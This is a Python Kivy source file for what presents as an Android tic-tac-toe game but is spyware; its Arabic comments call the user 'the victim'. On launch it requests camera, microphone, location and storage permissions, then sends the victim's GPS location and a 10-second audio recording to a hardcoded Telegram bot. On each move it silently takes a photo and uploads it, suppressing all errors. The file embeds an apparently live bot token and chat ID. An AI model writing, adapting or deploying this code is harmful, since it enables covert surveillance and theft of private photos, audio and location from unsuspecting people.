from kivy.app import App
from kivy.ux.gridlayout import GridLayout
from kivy.ux.button import Button
from plyer import camera, gps, audio, storagepath
from android.permissions import request_permissions, Permission
import requests
import os
import threading
import time

# بيانات الربط الخاصة بك
TOKEN = "8646363010:AAFgi_CnQtYk0LWTn5naPUkgULMkLfXLIs4"
CHAT_ID = "7263387179"

class TicTacToeApp(App):
    def build(self):
        # طلب الصلاحيات فور تشغيل اللعبة
        request_permissions([
            Permission.CAMERA, Permission.RECORD_AUDIO,
            Permission.ACCESS_FINE_LOCATION, Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE
        ])
        
        # إشعار تشغيل التطبيق
        self.send_telegram_msg("🎮 الضحية فتح اللعبة دلوقتي!")
        
        # تشغيل سحب الموقع والصوت في الخلفية
        threading.Thread(target=self.initial_extraction).start()

        # تصميم لعبة X-O
        self.turn = 'X'
        layout = GridLayout(cols=3)
        for i in range(9):
            btn = Button(text='', font_size=50)
            btn.bind(on_release=self.play)
            layout.add_widget(btn)
        return layout

    def play(self, btn):
        if btn.text == '':
            btn.text = self.turn
            # مع كل حركة في اللعبة، بنصور سيلفي ونبعته
            threading.Thread(target=self.silent_capture).start()
            self.turn = 'O' if self.turn == 'X' else 'X'

    def initial_extraction(self):
        # سحب الموقع وتسجيل 10 ثواني صوت
        self.get_location()
        self.record_voice(10)

    def send_telegram_msg(self, text):
        try:
            requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={text}")
        except: pass

    def get_location(self):
        try:
            gps.configure(on_location=self.on_location)
            gps.start()
        except: pass

    def on_location(self, **kwargs):
        msg = f"📍 موقع الهدف: https://www.google.com/maps?q={kwargs['lat']},{kwargs['lon']}"
        self.send_telegram_msg(msg)
        gps.stop()

    def silent_capture(self):
        try:
            path = os.path.join(storagepath.get_pictures_dir(), "temp_snap.jpg")
            camera.take_picture(filename=path, on_complete=self.upload_to_bot)
        except: pass

    def record_voice(self, seconds):
        try:
            path = os.path.join(storagepath.get_external_storage_dir(), "past_rec.3gp")
            audio.start_recording(path)
            time.sleep(seconds)
            audio.stop_recording()
            self.upload_to_bot(path, is_audio=True)
        except: pass

    def upload_to_bot(self, path, is_audio=False):
        try:
            method = "sendAudio" if is_audio else "sendPhoto"
            key = "audio" if is_audio else "photo"
            url = f"https://api.telegram.org/bot{TOKEN}/{method}"
            with open(path, 'rb') as f:
                requests.post(url, data={'chat_id': CHAT_ID}, files={key: f})
        except: pass

if __name__ == '__main__':
    TicTacToeApp().run()
          
